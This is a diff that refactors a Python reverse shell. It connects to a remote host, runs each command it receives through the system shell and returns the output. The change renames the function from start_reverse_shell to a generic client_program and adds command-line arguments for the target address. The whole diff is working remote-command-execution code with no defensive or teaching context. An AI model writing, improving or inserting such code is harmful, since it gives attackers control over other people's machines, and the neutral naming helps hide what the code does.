@@ -1,27 +1,30 @@
 import socket
 import subprocess
+import sys
 
-def start_reverse_shell(target_ip, target_port):
-    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    client.connect((target_ip, target_port))
+def client_program(target_ip='127.0.0.1', target_port=9999):
+    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    client_socket.connect((target_ip, target_port))
 
-    try:
-        while True:
-            command = client.recv(1024).decode('utf-8')
+    while True:
+        try:
+            command = client_socket.recv(1024).decode('utf-8')
             if command.lower() == 'exit':
                 break
             if command.strip():
-                try:
-                    output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
-                except subprocess.CalledProcessError as e:
-                    output = e.output
-                client.sendall(output)
-    except Exception as e:
-        print(f"[-] Exception: {e}")
-    finally:
-        client.close()
+                output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
+                client_socket.send(output)
+        except Exception as e:
+            client_socket.send(str(e).encode('utf-8'))
+
+    client_socket.close()
 
 if __name__ == "__main__":
-    target_ip = "127.0.0.1"
-    target_port = 9999
-    start_reverse_shell(target_ip, target_port)
+    if len(sys.argv) == 3:
+        target_ip = sys.argv[1]
+        target_port = int(sys.argv[2])
+    else:
+        target_ip = '127.0.0.1'
+        target_port = 9999
+
+    client_program(target_ip, target_port)
